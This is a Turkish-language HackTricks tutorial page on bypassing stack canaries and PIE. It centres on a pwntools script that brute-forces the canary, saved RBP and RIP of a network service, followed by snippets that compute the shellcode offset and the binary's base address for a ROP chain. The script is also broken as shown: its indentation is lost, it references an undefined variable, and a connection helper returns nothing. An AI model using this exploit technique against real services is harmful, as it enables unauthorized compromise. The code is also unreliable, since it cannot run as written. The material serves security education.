# Yığında BF Adresleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı takip edin.
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**Bir canary ve PIE (Pozisyon Bağımsız Yürütülebilir) ile korunan bir ikiliyle karşı karşıyaysanız, muhtemelen bunları atlatmanın bir yolunu bulmanız gerekecektir.**

![](<../../../.gitbook/assets/image (862).png>)

{% hint style="info" %}
**`checksec`**'in, bir ikilinin bir canary tarafından korunduğunu bulamayabileceğini unutmayın, bu statik olarak derlenmişse ve işlevi tanımlayamıyorsa.\
Ancak, bir değerin bir işlev çağrısının başında yığına kaydedildiğini ve bu değerin çıkış yapmadan önce kontrol edildiğini fark ederseniz, bunu manuel olarak fark edebilirsiniz.
{% endhint %}

## Brute-Force Adresleri

PIE'yi atlatmak için **bazı adresleri sızdırmanız** gerekmektedir. Ve eğer ikili herhangi bir adres sızdırmıyorsa, en iyisi **yığındaki RBP ve RIP'yi brute-force etmektir**.\
Örneğin, bir ikili hem bir **canary** hem de **PIE** kullanarak korunuyorsa, önce canary'yi brute-force etmeye başlayabilir, ardından **sonraki** 8 Bayt (x64) kaydedilmiş **RBP** ve **sonraki** 8 Bayt kaydedilmiş **RIP** olacaktır.

{% hint style="success" %}
Yığın içindeki dönüş adresinin genellikle ana ikili koduna ait olduğu varsayılır, bu da zafiyetin ikili kodda bulunduğu durumda genellikle geçerli olacaktır.
{% endhint %}

İkiliden RBP ve RIP'yi brute-force etmek için, bir geçerli tahmin edilen baytın doğru olduğunu programın bir çıktı verdiğini veya sadece çökmeyi önlediğini fark edebilirsiniz. Canlı bir programın canary'yi brute-force etmek için sağladığı **aynı işlev**, RBP ve RIP'yi brute-force etmek için de kullanılabilir:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Son şey, PIE'ı yenmek için ihtiyacınız olan **sızdırılan adreslerden yararlı adresleri hesaplamaktır**: **RBP** ve **RIP**.

**RBP** adresinden, **kabuğunuzu yığında nereye yazdığınızı hesaplayabilirsiniz**. Bu, _"/bin/sh\x00"_ dizesini yığının içine nereye yazacağınızı bilmek çok faydalı olabilir. Sızdırılan RBP ve kabuğunuz arasındaki mesafeyi hesaplamak için sadece **RBP sızdırdıktan sonra bir kesme noktası koyabilir** ve **kabuğunuzun nerede bulunduğunu kontrol edebilirsiniz**, ardından kabuk ve RBP arasındaki mesafeyi hesaplayabilirsiniz:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP**'ten, **PIE ikili dosyasının taban adresini** hesaplayabilirsiniz, bu da **geçerli bir ROP zinciri oluşturmak için ihtiyacınız olan şeydir.**\
Taban adresini hesaplamak için sadece `objdump -d vunbinary` komutunu çalıştırın ve en son adresleri kontrol edin:

![](<../../../.gitbook/assets/image (476).png>)

Bu örnekte, tüm kodları bulmak için sadece **1 Byte ve yarım** gerektiğini görebilirsiniz, bu durumda taban adresi, **sızdırılan RIP'in "000" ile biten hali olacaktır**. Örneğin, `0x562002970ecf` sızdırdıysanız, taban adresi `0x562002970000` olacaktır.
```python
elf.address = RIP - (RIP & 0xfff)
```
## İyileştirmeler

[**Bu gönderiden bazı gözlemlere göre**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), RBP ve RIP değerlerinin sızdırıldığında, sunucunun bazı doğru olmayan değerlerle çökmediği ve BF betiğinin doğru değerleri aldığını düşüneceği mümkündür. Bu, **bazı adreslerin, tam olarak doğru olanlar olmasa bile, onu kıramayabileceği mümkündür**.

Bu blog gönderisine göre sunucuya yapılan istekler arasına kısa bir gecikme eklemek önerilir.
